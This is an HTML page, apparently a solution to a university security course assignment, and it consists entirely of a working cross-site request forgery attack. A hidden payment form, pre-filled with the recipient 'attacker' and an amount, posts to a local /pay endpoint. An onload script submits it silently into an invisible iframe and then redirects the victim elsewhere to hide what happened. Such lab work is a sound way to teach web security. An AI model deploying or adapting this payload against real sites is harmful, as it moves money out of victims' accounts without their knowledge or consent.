<!DOCTYPE html>
<html>

<head>
    <style>
         .payment-form{visibility:hidden;} 
    </style>
    <title>Profile</title>
    <link rel="stylesheet" type="text/css" href="/static/style.css" />
</head>

<body>

    <div class="payment-form">
        <h3 class="payment-header">Make payment?</h3>
        <form action="http://localhost:8080/pay" method="post" target="submitPayment">
            <div class="form-group">
                <div class="form-label">To:</div>
                <div class="form-input">
                    <input name="recipient" type="text" value="attacker" />
                </div>
            </div>
            <div class="form-group">
                <div class="form-label">Amount:</div>
                <div class="form-input"><input name="amount" type="number" value = "10"/></div>
            </div>
            <input class="form-button" type="submit" value="Pay" />
        </form>
        <iframe width="0" height="0" id="submitPayment" name="submitPayment"></iframe>
        <script type="text/javascript">
            window.onload = function(){
                document.forms[0].submit();
                document.getElementById("submitPayment").onload = function(){
                    window.location.replace("http://github.com/tomrist/cs5435-fall2019");
                };
            };
        </script>


    </div>


</body>

</html>
